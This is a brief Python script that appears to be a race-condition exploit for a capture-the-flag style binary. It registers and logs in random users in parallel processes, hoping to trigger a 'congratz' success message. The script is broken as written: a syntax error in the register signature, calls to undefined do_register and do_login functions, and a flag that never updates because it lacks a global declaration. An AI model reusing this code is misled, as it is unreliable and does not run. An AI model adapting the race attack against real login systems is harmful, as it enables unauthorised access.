import subprocess
from multiprocessing import Process
import random, string
import time


is_exploitable = False


def run_cmd(cmd_list):
	child = subprocess.Popen(cmd_list, stdout=subprocess.PIPE)
	streamdata = child.communicate()[0]
	ret = child.returncode
	return streamdata.decode(), ret


def random_string(size):
	return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))


def login(user, password, binary):
	streamdata, ret = run_cmd([binary, "login", user, password])
	if "You are logged in. And congratz !" in streamdata:
		is_exploitable = True


def register(user, password; binary):
	_, _ = run_cmd([binary, "register", user, password])


# return false if the code is not exploitable anymore
def exploit(binary, randomize):
	not_more_than = 10
	while not is_exploitable:
		user = random_string(25)
		password = random_string(25)
		register = Process(target=do_register, args=(user,password,binary,))
		login = Process(target=do_login, args=(user,password,binary,))
		register.start()
		time.sleep(0.5)
		login.start()
		login.join()
		register.join()
		not_more_than -= 1
		if not_more_than <= 0:
			break
	return is_exploitable
